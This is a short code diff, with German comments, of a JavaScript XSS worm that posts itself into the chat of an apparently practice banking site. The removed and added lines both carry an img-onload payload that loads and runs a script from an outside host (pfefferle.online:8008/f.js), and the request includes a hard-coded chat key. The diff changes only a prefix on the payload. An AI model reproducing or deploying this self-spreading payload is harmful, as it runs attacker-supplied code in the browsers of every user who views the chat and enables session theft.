@@ -12,7 +12,7 @@ console.log('still works');
 // sich selbst in den Chat schreiben
 (function(){ // anonyme, selbstausführende Funktion
     var x = new XMLHttpRequest();
-    var payload =  "\\u003cimg src=\\u0022data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\\u0022 onload=\\u0022script = document.createElement('script');script.src ='http://pfefferle.online:8008/f.js';document.head.appendChild(script);\\u0022\\u003e";
+    var payload =  "4242\\u003cimg src=\\u0022data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\\u0022 onload=\\u0022script = document.createElement('script');script.src ='http://pfefferle.online:8008/f.js';document.head.appendChild(script);\\u0022\\u003e";
     x.open('POST', '/banking/?page=chat');
     x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     x.send('name=&message=' + encodeURIComponent(payload) + '&key=SusiAndPinhead4EverAndEverAndEver&sendto_me=absenden');
